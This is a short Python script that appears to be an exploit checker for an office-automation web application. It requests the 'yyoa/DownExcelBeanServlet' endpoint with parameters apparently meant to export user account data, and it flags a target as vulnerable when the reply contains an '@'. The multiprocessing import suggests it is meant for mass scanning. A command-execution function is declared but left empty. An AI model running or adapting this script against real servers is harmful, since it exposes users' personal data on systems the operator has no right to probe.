import time
import argparse
import requests
import multiprocessing


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def exp_check(target_url):
    vuln_url = target_url + "yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
    }
    try:
        response = requests.get(vuln_url, headers=headers, timeout=5)
        if "@" in response.text and response.status_code == 200:
            return 1
        else:
            return 2
    except:
        return 3



def exp_cmd(url,cmd):
    pass